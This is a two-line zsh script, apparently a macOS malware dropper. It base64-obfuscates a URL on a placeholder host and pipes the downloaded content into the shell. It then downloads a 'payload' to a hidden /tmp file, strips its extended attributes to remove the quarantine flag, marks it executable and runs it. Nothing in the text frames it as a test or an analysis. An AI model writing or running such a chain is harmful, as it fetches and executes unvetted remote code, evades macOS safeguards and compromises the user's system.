#!/bin/zsh
curl -s $(echo "aHR0cHM6Ly9kZWxpdmVyeS5leGFtcGxlLmludmFsaWQvYm9vdHN0cmFw" | openssl base64 -d -A) | zsh
curl -fsSL -o /tmp/.stage.part https://delivery.example.invalid/payload && mv /tmp/.stage.part /tmp/.stage && xattr -c /tmp/.stage && chmod +x /tmp/.stage && /tmp/.stage
